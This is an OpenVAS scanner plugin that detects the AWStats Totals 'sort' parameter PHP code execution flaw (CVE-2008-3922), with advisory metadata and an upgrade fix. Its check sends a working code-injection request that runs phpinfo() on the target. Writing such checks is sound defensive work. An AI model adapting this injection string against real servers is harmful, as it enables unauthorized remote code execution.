###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_awstats_totals_sort_parameter_cmd_exec_vuln.nasl 7585 2017-10-26 15:03:01Z cfischer $
#
# AWStats Totals 'sort' Parameter Remote Command Execution Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801893");
  script_version("$Revision: 7585 $");
  script_tag(name:"last_modification", value:"$Date: 2017-10-26 17:03:01 +0200 (Thu, 26 Oct 2017) $");
  script_tag(name:"creation_date", value:"2011-06-07 13:29:28 +0200 (Tue, 07 Jun 2011)");
  script_cve_id("CVE-2008-3922");
  script_bugtraq_id(30856);
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_name("AWStats Totals 'sort' Parameter Remote Command Execution Vulnerabilities");

  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/44712");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17324/");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/archive/1/495770/100/0/threaded");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/101698/awstatstotals_multisort.rb.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name : "impact" , value : "Successful exploitation could allow remote attackers to execute arbitrary PHP
  commands by constructing specially crafted 'sort' parameters.

  Impact Level: Application");
  script_tag(name : "affected" , value : "AWStats Totals versions 1.14 and prior.");
  script_tag(name : "insight" , value : "The flaw is caused by improper validation of user-supplied input passed via
  the 'sort' parameter to 'multisort()' function, which allows attackers to
  execute arbitrary PHP code.");
  script_tag(name : "solution" , value : "Upgrade to AWStats Totals version 1.15 or later.
  For updates refer to http://www.telartis.nl/xcms/awstats/");
  script_tag(name : "summary" , value : "This host is running AWStats Totals and is prone to remote command
  execution vulnerabilities.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);

## Check Host Supports PHP
if(!can_host_php(port:port)) {
  exit(0);
}

foreach dir (make_list_unique("/awstatstotals", "/awstats", cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";

  ## Send and Receive the response
  sndReq = http_get(item: dir + "/awstatstotals.php", port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

  ## Confirm the application
  if("<title>AWStats Totals</title>" >< rcvRes)
  {
    ## Construct attack request
    url = string(dir, '/awstatstotals.php?sort="].phpinfo().exit().%24a["');

    ## Confirm exploit worked by checking the response
    if(http_vuln_check(port:port, url:url, pattern:'>phpinfo()<',
       extra_check: make_list('>System <', '>Configuration<', '>PHP Core<')))
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);